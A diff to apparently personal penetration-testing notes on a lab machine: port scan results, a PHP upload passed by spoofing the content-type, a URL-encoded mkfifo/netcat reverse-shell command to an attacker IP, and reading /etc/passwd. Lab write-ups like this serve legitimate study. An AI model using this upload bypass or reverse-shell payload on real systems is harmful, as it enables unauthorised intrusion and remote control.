@@ -1,16 +1,16 @@
 LESSON LEARNED: 
 - Always use gobuster medium and common
 - If Creating your own torrent file wont do , just download real one
-- always check for files especially user home files
-- update finding files skill / note
-- update upload bypass notes
+- Always check for files especially user home files
+- Update finding files skill / note
+- Update upload bypass notes
 
 
-port 22
+Port 22
 =========
  OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
 
-port 80
+Port 80
 ============
 /test
 Suhosin Patch 0.9.7
@@ -28,15 +28,16 @@ upload kali image downloaded from kali official website
 edit torrent and add screenshot
 
 file extension : test1.php
+```
 content-type : image/png
-
+```
 looks like file name is not filtered but content-type is filtered
 
 
 /torret/uploads/ewqo9129321-test1.php
-
+```
 ?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.26%204567%20%3E%2Ftmp%2Ff
-
+```
 cat /etc/passwd got user george
 at /home/george found .cache/motd.legal-displayed 
 
